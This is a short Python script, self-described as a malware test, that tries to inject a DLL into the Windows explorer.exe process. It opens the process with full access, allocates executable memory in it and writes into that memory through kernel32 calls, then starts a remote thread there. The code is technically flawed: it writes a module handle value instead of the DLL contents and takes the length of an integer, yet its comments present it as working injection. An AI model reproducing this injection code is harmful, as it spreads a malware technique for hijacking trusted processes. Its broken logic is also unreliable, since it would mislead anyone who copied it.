# Python Malware Test One- Basic DLL injection into explorer.exe
# Not Fully Complete

# This script attempts to inject a DLL named "injrcted.dll" into the "explorer.exe" process using the Windows API functions provided by ctypes.windll.kernel32. 
# It first loads the DLL file, retrieves the process ID (PID) of the "explorer.exe" process, opens a handle to that process, 
# allocates memory within it, writes the DLL file into the allocated memory,and finally creates a remote thread within the process to execute the DLL.

import ctypes  # For interacting with the Windows API
import psutil  # For retrieving process information

# Load the DLL file
dll = ctypes.CDLL("path/to/injrcted.dll")

# Get the process ID of the explorer.exe process
for proc in psutil.process_iter():
    if proc.name() == "explorer.exe":
        pid = proc.pid
        break

# Open a handle to the explorer.exe process
# Flags: 0x1F0FFF (PROCESS_ALL_ACCESS) grants all possible access rights to the process
handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)

# Allocate memory in the process
# Parameters: hProcess (handle to the process), dwSize (size of the memory allocation),
# flAllocationType (type of allocation), flProtect (memory protection constant)
memory = ctypes.windll.kernel32.VirtualAllocEx(handle, 0, len(dll._handle), 0x1000, 0x40)

# Write the DLL file to the allocated memory
# Parameters: hProcess (handle to the process), lpBaseAddress (address of the memory to write to),
# lpBuffer (buffer containing the data to be written), nSize (number of bytes to write),
# lpNumberOfBytesWritten (optional pointer to receive the number of bytes written)
ctypes.windll.kernel32.WriteProcessMemory(handle, memory, dll._handle, len(dll._handle), 0)

# Create a remote thread in the process to execute the DLL
# Parameters: hProcess (handle to the process), lpThreadAttributes (security attributes),
# dwStackSize (stack size), lpStartAddress (address of the function to execute),
# lpParameter (pointer to a variable to be passed to the thread function), dwCreationFlags (creation flags),
# lpThreadId (pointer to a variable to receive the thread identifier)
thread_id = ctypes.c_ulong(0)
ctypes.windll.kernel32.CreateRemoteThread(handle, None, 0, memory, None, 0, ctypes.byref(thread_id))
